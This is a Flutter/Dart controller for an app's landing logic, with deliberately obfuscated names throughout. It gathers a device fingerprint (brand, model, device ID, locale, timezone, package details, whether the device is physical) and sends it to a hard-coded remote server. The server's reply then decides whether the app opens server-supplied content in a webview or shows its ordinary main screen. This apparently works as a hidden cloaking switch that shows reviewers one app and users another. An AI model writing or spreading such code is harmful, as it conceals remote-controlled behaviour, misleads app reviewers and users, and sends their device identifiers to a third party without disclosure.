import 'dart:io';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';

import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:get/get.dart';



class CproLandLogic extends GetxController {

  var gdqiyhur = RxBool(false);
  var gkmnsbhxw = RxBool(true);
  var cfdmwl = RxString("");
  var hardy = RxBool(false);
  var muller = RxBool(true);
  final wbzlrmaqji = Dio();


  InAppWebViewController? webViewController;

  dynamic tuqoypwrsn(){
    final noivacl = InternetConnectionChecker.instance;
    final tkjnup = noivacl.onStatusChange.skip(1).listen(
          (InternetConnectionStatus dcnfeiuagj) {
        if (dcnfeiuagj == InternetConnectionStatus.connected) {
          pcaoefdm();
        } else {
          Get.toNamed('/cpro_mode')?.then((_){
            pcaoefdm();
          });
        }
      },
    );
    return tkjnup;
  }

  Future<bool> efxgqhsbdn() async {
    var rjefgsa = await InternetConnectionChecker.instance.hasConnection;
    if(!rjefgsa){
      Get.toNamed('/cpro_mode')?.then((_){
        pcaoefdm();
      });
    }
    return rjefgsa;
  }

  @override
  void onInit() {
    super.onInit();
    tuqoypwrsn();
    pcaoefdm();
  }


  Future<void> pcaoefdm() async {

    var zopdfe = await efxgqhsbdn();
    if(!zopdfe){
      return;
    }

    hardy.value = true;
    muller.value = true;
    gkmnsbhxw.value = false;

    wbzlrmaqji.post("https://alone.twistebe.com/hzarxjmgcskqofybuneldpiwvt",data: await skoebx()).then((value) {
      var fesrvz = value.data["fesrvz"] as String;
      var hcnsz = value.data["hcnsz"] as bool;
      if (hcnsz) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        cfdmwl.value = fesrvz;
        taylor();
      } else {
        fadel();
      }
    }).catchError((e) {
      gkmnsbhxw.value = true;
      muller.value = true;
      hardy.value = false;
    });
  }

  Future<Map<String, dynamic>> skoebx() async {
    final DeviceInfoPlugin cfxoys = DeviceInfoPlugin();
    PackageInfo nrgplmct_mpfges = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var stcbzdy = Platform.localeName;
    var yxwkonea = currentTimeZone;

    var kovb = nrgplmct_mpfges.packageName;
    var jesnrx = nrgplmct_mpfges.version;
    var inglah = nrgplmct_mpfges.buildNumber;

    var yngdv = nrgplmct_mpfges.appName;
    var ivrnwkt = "";
    var ozseycbv  = "";
    var ckhpm = "";
    var deborahAdams = "";
    var alanisWalker = "";
    var damienMoen = "";


    var dxkpe = "";
    var mozqyu = false;

    if (GetPlatform.isAndroid) {
      dxkpe = "android";
      var opukawh = await cfxoys.androidInfo;

      ckhpm = opukawh.brand;

      ivrnwkt  = opukawh.model;
      ozseycbv = opukawh.id;

      mozqyu = opukawh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dxkpe = "ios";
      var fkjtybdo = await cfxoys.iosInfo;
      ckhpm = fkjtybdo.name;
      ivrnwkt = fkjtybdo.model;

      ozseycbv = fkjtybdo.identifierForVendor ?? "";
      mozqyu  = fkjtybdo.isPhysicalDevice;
    }
    var res = {
      "yngdv": yngdv,
      "stcbzdy": stcbzdy,
      "jesnrx": jesnrx,
      "kovb": kovb,
      "damienMoen" : damienMoen,
      "ivrnwkt": ivrnwkt,
      "yxwkonea": yxwkonea,
      "deborahAdams" : deborahAdams,
      "ckhpm": ckhpm,
      "ozseycbv": ozseycbv,
      "dxkpe": dxkpe,
      "inglah": inglah,
      "mozqyu": mozqyu,
      "alanisWalker" : alanisWalker,

    };
    return res;
  }

  Future<void> fadel() async {
    Get.offNamed("/cpro_main");
  }

  Future<void> taylor() async {
    Get.offNamed("/cpro_slider");
  }

  @override
  void dispose() {
    tuqoypwrsn().cancel();
    super.dispose();
  }

}
